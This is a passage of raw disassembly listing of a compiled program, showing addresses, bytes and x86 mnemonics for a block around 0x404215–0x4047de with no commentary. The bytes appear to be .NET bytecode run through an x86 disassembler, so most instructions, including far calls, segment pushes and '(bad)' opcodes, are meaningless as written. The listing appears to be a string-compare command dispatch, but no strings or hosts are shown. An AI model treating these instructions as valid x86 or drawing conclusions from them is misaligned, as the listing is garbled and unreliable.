  404215:	23 72 19             	and    0x19(%edx),%esi
  404218:	06                   	push   %es
  404219:	00 70 16             	add    %dh,0x16(%eax)
  40421c:	28 69 00             	sub    %ch,0x0(%ecx)
  40421f:	00 0a                	add    %cl,(%edx)
  404221:	16                   	push   %ss
  404222:	33 17                	xor    (%edi),%edx
  404224:	16                   	push   %ss
  404225:	13 14 06             	adc    (%esi,%eax,1),%edx
  404228:	7b 28                	jnp    0x404252
  40422a:	00 00                	add    %al,(%eax)
  40422c:	04 17                	add    $0x17,%al
  40422e:	9a 11 14 28 ad 00 00 	lcall  $0x0,$0xad281411
  404235:	0a 38                	or     (%eax),%bh
  404237:	6d                   	insl   (%dx),%es:(%edi)
  404238:	1b 00                	sbb    (%eax),%eax
  40423a:	00 11                	add    %dl,(%ecx)
  40423c:	23 72 37             	and    0x37(%edx),%esi
  40423f:	06                   	push   %es
  404240:	00 70 16             	add    %dh,0x16(%eax)
  404243:	28 69 00             	sub    %ch,0x0(%ecx)
  404246:	00 0a                	add    %cl,(%edx)
  404248:	16                   	push   %ss
  404249:	33 1c 28             	xor    (%eax,%ebp,1),%ebx
  40424c:	04 00                	add    $0x0,%al
  40424e:	00 06                	add    %al,(%esi)
  404250:	6f                   	outsl  %ds:(%esi),(%dx)
  404251:	a1 00 00 0a 06       	mov    0x60a0000,%eax
  404256:	7b 28                	jnp    0x404280
  404258:	00 00                	add    %al,(%eax)
  40425a:	04 17                	add    $0x17,%al
  40425c:	9a 6f ae 00 00 0a 38 	lcall  $0x380a,$0xae6f
  404263:	41                   	inc    %ecx
  404264:	1b 00                	sbb    (%eax),%eax
  404266:	00 11                	add    %dl,(%ecx)
  404268:	23 72 55             	and    0x55(%edx),%esi
  40426b:	06                   	push   %es
  40426c:	00 70 16             	add    %dh,0x16(%eax)
  40426f:	28 69 00             	sub    %ch,0x0(%ecx)
  404272:	00 0a                	add    %cl,(%edx)
  404274:	16                   	push   %ss
  404275:	33 17                	xor    (%edi),%edx
  404277:	06                   	push   %es
  404278:	7b 28                	jnp    0x4042a2
  40427a:	00 00                	add    %al,(%eax)
  40427c:	04 17                	add    $0x17,%al
  40427e:	9a 28 af 00 00 0a 6f 	lcall  $0x6f0a,$0xaf28
  404285:	4e                   	dec    %esi
  404286:	00 00                	add    %al,(%eax)
  404288:	0a 38                	or     (%eax),%bh
  40428a:	1a 1b                	sbb    (%ebx),%bl
  40428c:	00 00                	add    %al,(%eax)
  40428e:	11 23                	adc    %esp,(%ebx)
  404290:	72 69                	jb     0x4042fb
  404292:	06                   	push   %es
  404293:	00 70 16             	add    %dh,0x16(%eax)
  404296:	28 69 00             	sub    %ch,0x0(%ecx)
  404299:	00 0a                	add    %cl,(%edx)
  40429b:	16                   	push   %ss
  40429c:	33 60 72             	xor    0x72(%eax),%esp
  40429f:	83 06 00             	addl   $0x0,(%esi)
  4042a2:	70 7e                	jo     0x404322
  4042a4:	19 00                	sbb    %eax,(%eax)
  4042a6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4042a9:	71 00                	jno    0x4042ab
  4042ab:	00 0a                	add    %cl,(%edx)
  4042ad:	06                   	push   %es
  4042ae:	7b 28                	jnp    0x4042d8
  4042b0:	00 00                	add    %al,(%eax)
  4042b2:	04 17                	add    $0x17,%al
  4042b4:	9a 28 b0 00 00 0a 28 	lcall  $0x280a,$0xb028
  4042bb:	b1 00                	mov    $0x0,%cl
  4042bd:	00 0a                	add    %cl,(%edx)
  4042bf:	28 71 00             	sub    %dh,0x0(%ecx)
  4042c2:	00 0a                	add    %cl,(%edx)
  4042c4:	7e 19                	jle    0x4042df
  4042c6:	00 00                	add    %al,(%eax)
  4042c8:	04 28                	add    $0x28,%al
  4042ca:	71 00                	jno    0x4042cc
  4042cc:	00 0a                	add    %cl,(%edx)
  4042ce:	06                   	push   %es
  4042cf:	7b 28                	jnp    0x4042f9
  4042d1:	00 00                	add    %al,(%eax)
  4042d3:	04 18                	add    $0x18,%al
  4042d5:	9a 28 71 00 00 0a 7e 	lcall  $0x7e0a,$0x7128
  4042dc:	19 00                	sbb    %eax,(%eax)
  4042de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4042e1:	71 00                	jno    0x4042e3
  4042e3:	00 0a                	add    %cl,(%edx)
  4042e5:	28 38                	sub    %bh,(%eax)
  4042e7:	00 00                	add    %al,(%eax)
  4042e9:	06                   	push   %es
  4042ea:	28 71 00             	sub    %dh,0x0(%ecx)
  4042ed:	00 0a                	add    %cl,(%edx)
  4042ef:	28 3b                	sub    %bh,(%ebx)
  4042f1:	00 00                	add    %al,(%eax)
  4042f3:	0a 28                	or     (%eax),%ch
  4042f5:	1c 00                	sbb    $0x0,%al
  4042f7:	00 06                	add    %al,(%esi)
  4042f9:	38 aa 1a 00 00 11    	cmp    %ch,0x1100001a(%edx)
  4042ff:	23 72 a1             	and    -0x5f(%edx),%esi
  404302:	06                   	push   %es
  404303:	00 70 16             	add    %dh,0x16(%eax)
  404306:	28 69 00             	sub    %ch,0x0(%ecx)
  404309:	00 0a                	add    %cl,(%edx)
  40430b:	16                   	push   %ss
  40430c:	33 24 06             	xor    (%esi,%eax,1),%esp
  40430f:	7b 28                	jnp    0x404339
  404311:	00 00                	add    %al,(%eax)
  404313:	04 17                	add    $0x17,%al
  404315:	9a 06 7b 28 00 00 04 	lcall  $0x400,$0x287b06
  40431c:	18 9a 28 3a 00 00    	sbb    %bl,0x3a28(%edx)
  404322:	06                   	push   %es
  404323:	74 09                	je     0x40432e
  404325:	00 00                	add    %al,(%eax)
  404327:	1b 28                	sbb    (%eax),%ebp
  404329:	b2 00                	mov    $0x0,%dl
  40432b:	00 0a                	add    %cl,(%edx)
  40432d:	38 76 1a             	cmp    %dh,0x1a(%esi)
  404330:	00 00                	add    %al,(%eax)
  404332:	11 23                	adc    %esp,(%ebx)
  404334:	72 b7                	jb     0x4042ed
  404336:	06                   	push   %es
  404337:	00 70 16             	add    %dh,0x16(%eax)
  40433a:	28 69 00             	sub    %ch,0x0(%ecx)
  40433d:	00 0a                	add    %cl,(%edx)
  40433f:	16                   	push   %ss
  404340:	33 7a 06             	xor    0x6(%edx),%edi
  404343:	7b 28                	jnp    0x40436d
  404345:	00 00                	add    %al,(%eax)
  404347:	04 17                	add    $0x17,%al
  404349:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  404350:	72 b7                	jb     0x404309
  404352:	06                   	push   %es
  404353:	00 70 17             	add    %dh,0x17(%eax)
  404356:	8d 03                	lea    (%ebx),%eax
  404358:	00 00                	add    %al,(%eax)
  40435a:	01 13                	add    %edx,(%ebx)
  40435c:	25 11 25 16 06       	and    $0x6162511,%eax
  404361:	7b 28                	jnp    0x40438b
  404363:	00 00                	add    %al,(%eax)
  404365:	04 13                	add    $0x13,%al
  404367:	29 11                	sub    %edx,(%ecx)
  404369:	29 18                	sub    %ebx,(%eax)
  40436b:	13 2a                	adc    (%edx),%ebp
  40436d:	11 2a                	adc    %ebp,(%edx)
  40436f:	9a a2 11 25 13 24 11 	lcall  $0x1124,$0x132511a2
  404376:	24 14                	and    $0x14,%al
  404378:	14 17                	adc    $0x17,%al
  40437a:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  40437d:	00 01                	add    %al,(%ecx)
  40437f:	13 26                	adc    (%esi),%esp
  404381:	11 26                	adc    %esp,(%esi)
  404383:	16                   	push   %ss
  404384:	17                   	pop    %ss
  404385:	9c                   	pushf
  404386:	11 26                	adc    %esp,(%esi)
  404388:	17                   	pop    %ss
  404389:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40438d:	0a 26                	or     (%esi),%ah
  40438f:	11 26                	adc    %esp,(%esi)
  404391:	16                   	push   %ss
  404392:	90                   	nop
  404393:	2c 22                	sub    $0x22,%al
  404395:	11 29                	adc    %ebp,(%ecx)
  404397:	11 2a                	adc    %ebp,(%edx)
  404399:	11 24 16             	adc    %esp,(%esi,%edx,1)
  40439c:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  4043a3:	28 00                	sub    %al,(%eax)
  4043a5:	00 01                	add    %al,(%ecx)
  4043a7:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4043aa:	00 0a                	add    %cl,(%edx)
  4043ac:	28 6d 00             	sub    %ch,0x0(%ebp)
  4043af:	00 0a                	add    %cl,(%edx)
  4043b1:	74 28                	je     0x4043db
  4043b3:	00 00                	add    %al,(%eax)
  4043b5:	01 a2 38 ec 19 00    	add    %esp,0x19ec38(%edx)
  4043bb:	00 11                	add    %dl,(%ecx)
  4043bd:	23 72 bd             	and    -0x43(%edx),%esi
  4043c0:	06                   	push   %es
  4043c1:	00 70 16             	add    %dh,0x16(%eax)
  4043c4:	28 69 00             	sub    %ch,0x0(%ecx)
  4043c7:	00 0a                	add    %cl,(%edx)
  4043c9:	16                   	push   %ss
  4043ca:	33 28                	xor    (%eax),%ebp
  4043cc:	06                   	push   %es
  4043cd:	7b 28                	jnp    0x4043f7
  4043cf:	00 00                	add    %al,(%eax)
  4043d1:	04 17                	add    $0x17,%al
  4043d3:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  4043da:	72 c7                	jb     0x4043a3
  4043dc:	06                   	push   %es
  4043dd:	00 70 16             	add    %dh,0x16(%eax)
  4043e0:	8d 03                	lea    (%ebx),%eax
  4043e2:	00 00                	add    %al,(%eax)
  4043e4:	01 14 14             	add    %edx,(%esp,%edx,1)
  4043e7:	14 17                	adc    $0x17,%al
  4043e9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4043ed:	0a 26                	or     (%esi),%ah
  4043ef:	38 b4 19 00 00 11 23 	cmp    %dh,0x23110000(%ecx,%ebx,1)
  4043f6:	72 cf                	jb     0x4043c7
  4043f8:	06                   	push   %es
  4043f9:	00 70 16             	add    %dh,0x16(%eax)
  4043fc:	28 69 00             	sub    %ch,0x0(%ecx)
  4043ff:	00 0a                	add    %cl,(%edx)
  404401:	16                   	push   %ss
  404402:	33 28                	xor    (%eax),%ebp
  404404:	06                   	push   %es
  404405:	7b 28                	jnp    0x40442f
  404407:	00 00                	add    %al,(%eax)
  404409:	04 17                	add    $0x17,%al
  40440b:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  404412:	72 d9                	jb     0x4043ed
  404414:	06                   	push   %es
  404415:	00 70 16             	add    %dh,0x16(%eax)
  404418:	8d 03                	lea    (%ebx),%eax
  40441a:	00 00                	add    %al,(%eax)
  40441c:	01 14 14             	add    %edx,(%esp,%edx,1)
  40441f:	14 17                	adc    $0x17,%al
  404421:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404425:	0a 26                	or     (%esi),%ah
  404427:	38 7c 19 00          	cmp    %bh,0x0(%ecx,%ebx,1)
  40442b:	00 11                	add    %dl,(%ecx)
  40442d:	23 72 e9             	and    -0x17(%edx),%esi
  404430:	06                   	push   %es
  404431:	00 70 16             	add    %dh,0x16(%eax)
  404434:	28 69 00             	sub    %ch,0x0(%ecx)
  404437:	00 0a                	add    %cl,(%edx)
  404439:	16                   	push   %ss
  40443a:	33 38                	xor    (%eax),%edi
  40443c:	7e 23                	jle    0x404461
  40443e:	00 00                	add    %al,(%eax)
  404440:	04 17                	add    $0x17,%al
  404442:	33 02                	xor    (%edx),%eax
  404444:	2b 29                	sub    (%ecx),%ebp
  404446:	17                   	pop    %ss
  404447:	80 23 00             	andb   $0x0,(%ebx)
  40444a:	00 04 06             	add    %al,(%esi,%eax,1)
  40444d:	7b 28                	jnp    0x404477
  40444f:	00 00                	add    %al,(%eax)
  404451:	04 17                	add    $0x17,%al
  404453:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  40445a:	72 d9                	jb     0x404435
  40445c:	06                   	push   %es
  40445d:	00 70 16             	add    %dh,0x16(%eax)
  404460:	8d 03                	lea    (%ebx),%eax
  404462:	00 00                	add    %al,(%eax)
  404464:	01 14 14             	add    %edx,(%esp,%edx,1)
  404467:	14 17                	adc    $0x17,%al
  404469:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40446d:	0a 26                	or     (%esi),%ah
  40446f:	38 34 19             	cmp    %dh,(%ecx,%ebx,1)
  404472:	00 00                	add    %al,(%eax)
  404474:	11 23                	adc    %esp,(%ebx)
  404476:	72 f7                	jb     0x40446f
  404478:	06                   	push   %es
  404479:	00 70 16             	add    %dh,0x16(%eax)
  40447c:	28 69 00             	sub    %ch,0x0(%ecx)
  40447f:	00 0a                	add    %cl,(%edx)
  404481:	16                   	push   %ss
  404482:	33 25 28 b3 00 00    	xor    0xb328,%esp
  404488:	0a 72 03             	or     0x3(%edx),%dh
  40448b:	07                   	pop    %es
  40448c:	00 70 06             	add    %dh,0x6(%eax)
  40448f:	7b 28                	jnp    0x4044b9
  404491:	00 00                	add    %al,(%eax)
  404493:	04 17                	add    $0x17,%al
  404495:	9a 28 25 00 00 0a 16 	lcall  $0x160a,$0x2528
  40449c:	16                   	push   %ss
  40449d:	15 28 7f 00 00       	adc    $0x7f28,%eax
  4044a2:	0a 26                	or     (%esi),%ah
  4044a4:	38 ff                	cmp    %bh,%bh
  4044a6:	18 00                	sbb    %al,(%eax)
  4044a8:	00 11                	add    %dl,(%ecx)
  4044aa:	23 72 1b             	and    0x1b(%edx),%esi
  4044ad:	07                   	pop    %es
  4044ae:	00 70 16             	add    %dh,0x16(%eax)
  4044b1:	28 69 00             	sub    %ch,0x0(%ecx)
  4044b4:	00 0a                	add    %cl,(%edx)
  4044b6:	16                   	push   %ss
  4044b7:	40                   	inc    %eax
  4044b8:	bd 00 00 00 06       	mov    $0x6000000,%ebp
  4044bd:	7b 28                	jnp    0x4044e7
  4044bf:	00 00                	add    %al,(%eax)
  4044c1:	04 17                	add    $0x17,%al
  4044c3:	9a 72 23 07 00 70 15 	lcall  $0x1570,$0x72372
  4044ca:	16                   	push   %ss
  4044cb:	28 68 00             	sub    %ch,0x0(%eax)
  4044ce:	00 0a                	add    %cl,(%edx)
  4044d0:	13 36                	adc    (%esi),%esi
  4044d2:	16                   	push   %ss
  4044d3:	13 35 38 8f 00 00    	adc    0x8f38,%esi
  4044d9:	00 11                	add    %dl,(%ecx)
  4044db:	36 11 35 9a 13 15 11 	adc    %esi,%ss:0x1115139a
  4044e2:	15 28 3b 00 00       	adc    $0x3b28,%eax
  4044e7:	0a 28                	or     (%eax),%ch
  4044e9:	82 00 00             	addb   $0x0,(%eax)
  4044ec:	0a 2c 25 11 15 28 3b 	or     0x3b281511(,%eiz,1),%ch
  4044f3:	00 00                	add    %al,(%eax)
  4044f5:	0a 06                	or     (%esi),%al
  4044f7:	7b 28                	jnp    0x404521
  4044f9:	00 00                	add    %al,(%eax)
  4044fb:	04 18                	add    $0x18,%al
  4044fd:	9a 11 15 28 3b 00 00 	lcall  $0x0,$0x3b281511
  404504:	0a 28                	or     (%eax),%ch
  404506:	24 00                	and    $0x0,%al
  404508:	00 0a                	add    %cl,(%edx)
  40450a:	28 47 00             	sub    %al,0x0(%edi)
  40450d:	00 0a                	add    %cl,(%edx)
  40450f:	28 26                	sub    %ah,(%esi)
  404511:	00 00                	add    %al,(%eax)
  404513:	0a 11                	or     (%ecx),%dl
  404515:	15 28 3b 00 00       	adc    $0x3b28,%eax
  40451a:	0a 28                	or     (%eax),%ch
  40451c:	b4 00                	mov    $0x0,%ah
  40451e:	00 0a                	add    %cl,(%edx)
  404520:	2c 30                	sub    $0x30,%al
  404522:	28 04 00             	sub    %al,(%eax,%eax,1)
  404525:	00 06                	add    %al,(%esi)
  404527:	6f                   	outsl  %ds:(%esi),(%dx)
  404528:	a1 00 00 0a 11       	mov    0x110a0000,%eax
  40452d:	15 28 3b 00 00       	adc    $0x3b28,%eax
  404532:	0a 06                	or     (%esi),%al
  404534:	7b 28                	jnp    0x40455e
  404536:	00 00                	add    %al,(%eax)
  404538:	04 18                	add    $0x18,%al
  40453a:	9a 11 15 28 3b 00 00 	lcall  $0x0,$0x3b281511
  404541:	0a 28                	or     (%eax),%ch
  404543:	24 00                	and    $0x0,%al
  404545:	00 0a                	add    %cl,(%edx)
  404547:	28 47 00             	sub    %al,0x0(%edi)
  40454a:	00 0a                	add    %cl,(%edx)
  40454c:	17                   	pop    %ss
  40454d:	6f                   	outsl  %ds:(%esi),(%dx)
  40454e:	b5 00                	mov    $0x0,%ch
  404550:	00 0a                	add    %cl,(%edx)
  404552:	de 0f                	fimuls (%edi)
  404554:	25 28 29 00 00       	and    $0x2928,%eax
  404559:	0a 13                	or     (%ebx),%dl
  40455b:	16                   	push   %ss
  40455c:	28 2a                	sub    %ch,(%edx)
  40455e:	00 00                	add    %al,(%eax)
  404560:	0a de                	or     %dh,%bl
  404562:	00 11                	add    %dl,(%ecx)
  404564:	35 17 d6 13 35       	xor    $0x3513d617,%eax
  404569:	11 35 11 36 8e b7    	adc    %esi,0xb78e3611
  40456f:	3f                   	aas
  404570:	66 ff                	data16 (bad)
  404572:	ff                   	(bad)
  404573:	ff                   	(bad)
  404574:	38 2f                	cmp    %ch,(%edi)
  404576:	18 00                	sbb    %al,(%eax)
  404578:	00 11                	add    %dl,(%ecx)
  40457a:	23 72 27             	and    0x27(%edx),%esi
  40457d:	07                   	pop    %es
  40457e:	00 70 16             	add    %dh,0x16(%eax)
  404581:	28 69 00             	sub    %ch,0x0(%ecx)
  404584:	00 0a                	add    %cl,(%edx)
  404586:	16                   	push   %ss
  404587:	40                   	inc    %eax
  404588:	bd 00 00 00 06       	mov    $0x6000000,%ebp
  40458d:	7b 28                	jnp    0x4045b7
  40458f:	00 00                	add    %al,(%eax)
  404591:	04 17                	add    $0x17,%al
  404593:	9a 72 23 07 00 70 15 	lcall  $0x1570,$0x72372
  40459a:	16                   	push   %ss
  40459b:	28 68 00             	sub    %ch,0x0(%eax)
  40459e:	00 0a                	add    %cl,(%edx)
  4045a0:	13 38                	adc    (%eax),%edi
  4045a2:	16                   	push   %ss
  4045a3:	13 37                	adc    (%edi),%esi
  4045a5:	38 8f 00 00 00 11    	cmp    %cl,0x11000000(%edi)
  4045ab:	38 11                	cmp    %dl,(%ecx)
  4045ad:	37                   	aaa
  4045ae:	9a 13 17 11 17 28 3b 	lcall  $0x3b28,$0x17111713
  4045b5:	00 00                	add    %al,(%eax)
  4045b7:	0a 28                	or     (%eax),%ch
  4045b9:	82 00 00             	addb   $0x0,(%eax)
  4045bc:	0a 2c 25 11 17 28 3b 	or     0x3b281711(,%eiz,1),%ch
  4045c3:	00 00                	add    %al,(%eax)
  4045c5:	0a 06                	or     (%esi),%al
  4045c7:	7b 28                	jnp    0x4045f1
  4045c9:	00 00                	add    %al,(%eax)
  4045cb:	04 18                	add    $0x18,%al
  4045cd:	9a 11 17 28 3b 00 00 	lcall  $0x0,$0x3b281711
  4045d4:	0a 28                	or     (%eax),%ch
  4045d6:	24 00                	and    $0x0,%al
  4045d8:	00 0a                	add    %cl,(%edx)
  4045da:	28 47 00             	sub    %al,0x0(%edi)
  4045dd:	00 0a                	add    %cl,(%edx)
  4045df:	28 b6 00 00 0a 11    	sub    %dh,0x110a0000(%esi)
  4045e5:	17                   	pop    %ss
  4045e6:	28 3b                	sub    %bh,(%ebx)
  4045e8:	00 00                	add    %al,(%eax)
  4045ea:	0a 28                	or     (%eax),%ch
  4045ec:	b4 00                	mov    $0x0,%ah
  4045ee:	00 0a                	add    %cl,(%edx)
  4045f0:	2c 30                	sub    $0x30,%al
  4045f2:	28 04 00             	sub    %al,(%eax,%eax,1)
  4045f5:	00 06                	add    %al,(%esi)
  4045f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f8:	a1 00 00 0a 11       	mov    0x110a0000,%eax
  4045fd:	17                   	pop    %ss
  4045fe:	28 3b                	sub    %bh,(%ebx)
  404600:	00 00                	add    %al,(%eax)
  404602:	0a 06                	or     (%esi),%al
  404604:	7b 28                	jnp    0x40462e
  404606:	00 00                	add    %al,(%eax)
  404608:	04 18                	add    $0x18,%al
  40460a:	9a 11 17 28 3b 00 00 	lcall  $0x0,$0x3b281711
  404611:	0a 28                	or     (%eax),%ch
  404613:	24 00                	and    $0x0,%al
  404615:	00 0a                	add    %cl,(%edx)
  404617:	28 47 00             	sub    %al,0x0(%edi)
  40461a:	00 0a                	add    %cl,(%edx)
  40461c:	17                   	pop    %ss
  40461d:	6f                   	outsl  %ds:(%esi),(%dx)
  40461e:	b7 00                	mov    $0x0,%bh
  404620:	00 0a                	add    %cl,(%edx)
  404622:	de 0f                	fimuls (%edi)
  404624:	25 28 29 00 00       	and    $0x2928,%eax
  404629:	0a 13                	or     (%ebx),%dl
  40462b:	18 28                	sbb    %ch,(%eax)
  40462d:	2a 00                	sub    (%eax),%al
  40462f:	00 0a                	add    %cl,(%edx)
  404631:	de 00                	fiadds (%eax)
  404633:	11 37                	adc    %esi,(%edi)
  404635:	17                   	pop    %ss
  404636:	d6                   	salc
  404637:	13 37                	adc    (%edi),%esi
  404639:	11 37                	adc    %esi,(%edi)
  40463b:	11 38                	adc    %edi,(%eax)
  40463d:	8e b7 3f 66 ff ff    	mov    -0x99c1(%edi),%?
  404643:	ff                   	(bad)
  404644:	38 5f 17             	cmp    %bl,0x17(%edi)
  404647:	00 00                	add    %al,(%eax)
  404649:	11 23                	adc    %esp,(%ebx)
  40464b:	72 2f                	jb     0x40467c
  40464d:	07                   	pop    %es
  40464e:	00 70 16             	add    %dh,0x16(%eax)
  404651:	28 69 00             	sub    %ch,0x0(%ecx)
  404654:	00 0a                	add    %cl,(%edx)
  404656:	16                   	push   %ss
  404657:	33 28                	xor    (%eax),%ebp
  404659:	72 2f                	jb     0x40468a
  40465b:	07                   	pop    %es
  40465c:	00 70 7e             	add    %dh,0x7e(%eax)
  40465f:	19 00                	sbb    %eax,(%eax)
  404661:	00 04 28             	add    %al,(%eax,%ebp,1)
  404664:	66 00 00             	data16 add %al,(%eax)
  404667:	0a 28                	or     (%eax),%ch
  404669:	38 00                	cmp    %al,(%eax)
  40466b:	00 06                	add    %al,(%esi)
  40466d:	28 66 00             	sub    %ah,0x0(%esi)
  404670:	00 0a                	add    %cl,(%edx)
  404672:	28 3b                	sub    %bh,(%ebx)
  404674:	00 00                	add    %al,(%eax)
  404676:	0a 28                	or     (%eax),%ch
  404678:	1c 00                	sbb    $0x0,%al
  40467a:	00 06                	add    %al,(%esi)
  40467c:	38 27                	cmp    %ah,(%edi)
  40467e:	17                   	pop    %ss
  40467f:	00 00                	add    %al,(%eax)
  404681:	11 23                	adc    %esp,(%ebx)
  404683:	72 37                	jb     0x4046bc
  404685:	07                   	pop    %es
  404686:	00 70 16             	add    %dh,0x16(%eax)
  404689:	28 69 00             	sub    %ch,0x0(%ecx)
  40468c:	00 0a                	add    %cl,(%edx)
  40468e:	16                   	push   %ss
  40468f:	33 58 72             	xor    0x72(%eax),%ebx
  404692:	37                   	aaa
  404693:	07                   	pop    %es
  404694:	00 70 7e             	add    %dh,0x7e(%eax)
  404697:	19 00                	sbb    %eax,(%eax)
  404699:	00 04 28             	add    %al,(%eax,%ebp,1)
  40469c:	71 00                	jno    0x40469e
  40469e:	00 0a                	add    %cl,(%edx)
  4046a0:	06                   	push   %es
  4046a1:	7b 28                	jnp    0x4046cb
  4046a3:	00 00                	add    %al,(%eax)
  4046a5:	04 17                	add    $0x17,%al
  4046a7:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  4046ae:	72 3d                	jb     0x4046ed
  4046b0:	07                   	pop    %es
  4046b1:	00 70 16             	add    %dh,0x16(%eax)
  4046b4:	8d 03                	lea    (%ebx),%eax
  4046b6:	00 00                	add    %al,(%eax)
  4046b8:	01 14 14             	add    %edx,(%esp,%edx,1)
  4046bb:	14 28                	adc    $0x28,%al
  4046bd:	72 00                	jb     0x4046bf
  4046bf:	00 0a                	add    %cl,(%edx)
  4046c1:	7e 19                	jle    0x4046dc
  4046c3:	00 00                	add    %al,(%eax)
  4046c5:	04 28                	add    $0x28,%al
  4046c7:	66 00 00             	data16 add %al,(%eax)
  4046ca:	0a 28                	or     (%eax),%ch
  4046cc:	38 00                	cmp    %al,(%eax)
  4046ce:	00 06                	add    %al,(%esi)
  4046d0:	28 66 00             	sub    %ah,0x0(%esi)
  4046d3:	00 0a                	add    %cl,(%edx)
  4046d5:	28 71 00             	sub    %dh,0x0(%ecx)
  4046d8:	00 0a                	add    %cl,(%edx)
  4046da:	28 3b                	sub    %bh,(%ebx)
  4046dc:	00 00                	add    %al,(%eax)
  4046de:	0a 28                	or     (%eax),%ch
  4046e0:	1c 00                	sbb    $0x0,%al
  4046e2:	00 06                	add    %al,(%esi)
  4046e4:	38 bf 16 00 00 11    	cmp    %bh,0x11000016(%edi)
  4046ea:	23 72 4d             	and    0x4d(%edx),%esi
  4046ed:	07                   	pop    %es
  4046ee:	00 70 16             	add    %dh,0x16(%eax)
  4046f1:	28 69 00             	sub    %ch,0x0(%ecx)
  4046f4:	00 0a                	add    %cl,(%edx)
  4046f6:	16                   	push   %ss
  4046f7:	33 16                	xor    (%esi),%edx
  4046f9:	06                   	push   %es
  4046fa:	7b 28                	jnp    0x404724
  4046fc:	00 00                	add    %al,(%eax)
  4046fe:	04 17                	add    $0x17,%al
  404700:	9a 17 16 15 28 7f 00 	lcall  $0x7f,$0x28151617
  404707:	00 0a                	add    %cl,(%edx)
  404709:	26 38 99 16 00 00 11 	cmp    %bl,%es:0x11000016(%ecx)
  404710:	23 72 55             	and    0x55(%edx),%esi
  404713:	07                   	pop    %es
  404714:	00 70 16             	add    %dh,0x16(%eax)
  404717:	28 69 00             	sub    %ch,0x0(%ecx)
  40471a:	00 0a                	add    %cl,(%edx)
  40471c:	16                   	push   %ss
  40471d:	33 2b                	xor    (%ebx),%ebp
  40471f:	28 04 00             	sub    %al,(%eax,%eax,1)
  404722:	00 06                	add    %al,(%esi)
  404724:	6f                   	outsl  %ds:(%esi),(%dx)
  404725:	b8 00 00 0a 6f       	mov    $0x6f0a0000,%eax
  40472a:	b9 00 00 0a 28       	mov    $0x280a0000,%ecx
  40472f:	04 00                	add    $0x0,%al
  404731:	00 06                	add    %al,(%esi)
  404733:	6f                   	outsl  %ds:(%esi),(%dx)
  404734:	b8 00 00 0a 06       	mov    $0x60a0000,%eax
  404739:	7b 28                	jnp    0x404763
  40473b:	00 00                	add    %al,(%eax)
  40473d:	04 17                	add    $0x17,%al
  40473f:	9a 6f ba 00 00 0a 38 	lcall  $0x380a,$0xba6f
  404746:	5e                   	pop    %esi
  404747:	16                   	push   %ss
  404748:	00 00                	add    %al,(%eax)
  40474a:	11 23                	adc    %esp,(%ebx)
  40474c:	72 5d                	jb     0x4047ab
  40474e:	07                   	pop    %es
  40474f:	00 70 16             	add    %dh,0x16(%eax)
  404752:	28 69 00             	sub    %ch,0x0(%ecx)
  404755:	00 0a                	add    %cl,(%edx)
  404757:	16                   	push   %ss
  404758:	33 14 28             	xor    (%eax,%ebp,1),%edx
  40475b:	04 00                	add    $0x0,%al
  40475d:	00 06                	add    %al,(%esi)
  40475f:	6f                   	outsl  %ds:(%esi),(%dx)
  404760:	b8 00 00 0a 6f       	mov    $0x6f0a0000,%eax
  404765:	b9 00 00 0a 38       	mov    $0x380a0000,%ecx
  40476a:	3a 16                	cmp    (%esi),%dl
  40476c:	00 00                	add    %al,(%eax)
  40476e:	11 23                	adc    %esp,(%ebx)
  404770:	72 6b                	jb     0x4047dd
  404772:	07                   	pop    %es
  404773:	00 70 16             	add    %dh,0x16(%eax)
  404776:	28 69 00             	sub    %ch,0x0(%ecx)
  404779:	00 0a                	add    %cl,(%edx)
  40477b:	16                   	push   %ss
  40477c:	40                   	inc    %eax
  40477d:	88 00                	mov    %al,(%eax)
  40477f:	00 00                	add    %al,(%eax)
  404781:	06                   	push   %es
  404782:	7b 28                	jnp    0x4047ac
  404784:	00 00                	add    %al,(%eax)
  404786:	04 17                	add    $0x17,%al
  404788:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  40478f:	72 6b                	jb     0x4047fc
  404791:	07                   	pop    %es
  404792:	00 70 18             	add    %dh,0x18(%eax)
  404795:	8d 03                	lea    (%ebx),%eax
  404797:	00 00                	add    %al,(%eax)
  404799:	01 13                	add    %edx,(%ebx)
  40479b:	25 11 25 16 28       	and    $0x28162511,%eax
  4047a0:	38 00                	cmp    %al,(%eax)
  4047a2:	00 06                	add    %al,(%esi)
  4047a4:	a2 11 25 17 06       	mov    %al,0x6172511
  4047a9:	7b 28                	jnp    0x4047d3
  4047ab:	00 00                	add    %al,(%eax)
  4047ad:	04 13                	add    $0x13,%al
  4047af:	29 11                	sub    %edx,(%ecx)
  4047b1:	29 18                	sub    %ebx,(%eax)
  4047b3:	13 2a                	adc    (%edx),%ebp
  4047b5:	11 2a                	adc    %ebp,(%edx)
  4047b7:	9a a2 11 25 13 24 11 	lcall  $0x1124,$0x132511a2
  4047be:	24 14                	and    $0x14,%al
  4047c0:	14 18                	adc    $0x18,%al
  4047c2:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  4047c5:	00 01                	add    %al,(%ecx)
  4047c7:	13 26                	adc    (%esi),%esp
  4047c9:	11 26                	adc    %esp,(%esi)
  4047cb:	16                   	push   %ss
  4047cc:	16                   	push   %ss
  4047cd:	9c                   	pushf
  4047ce:	11 26                	adc    %esp,(%esi)
  4047d0:	17                   	pop    %ss
  4047d1:	17                   	pop    %ss
  4047d2:	9c                   	pushf
  4047d3:	11 26                	adc    %esp,(%esi)
  4047d5:	17                   	pop    %ss
  4047d6:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4047da:	0a 26                	or     (%esi),%ah
  4047dc:	11 26                	adc    %esp,(%esi)
  4047de:	17                   	pop    %ss
